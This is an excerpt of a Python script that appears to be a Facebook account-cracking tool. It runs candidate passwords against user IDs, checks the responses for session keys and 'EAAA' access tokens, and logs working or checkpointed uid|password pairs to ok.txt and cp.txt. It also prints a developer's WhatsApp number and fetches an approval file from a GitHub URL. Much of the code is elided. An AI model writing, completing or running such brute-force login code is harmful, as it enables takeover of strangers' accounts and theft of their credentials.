...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923097629172")

	subprocess.check_output(["am", "start", "https://wa.me/+923097629172"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/Waqar_jutt/OLD/main/Approval.txt').text
...
\033[0;96m##     ## ##     ## ##     ## #### #### 
 ...
 > \033[0;92mDEVELOPER     : WAQAR JUTT

 > \033[0;95mFACEBOOK ID   : WAQAR JUTT

 > \033[0;41mWHATSAPP      : +923097629172
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [WAQAR-OK😍] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[WAQAR-CP😭] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [WAQAR-CP😭] %s|%s\n"%(uid, pw))
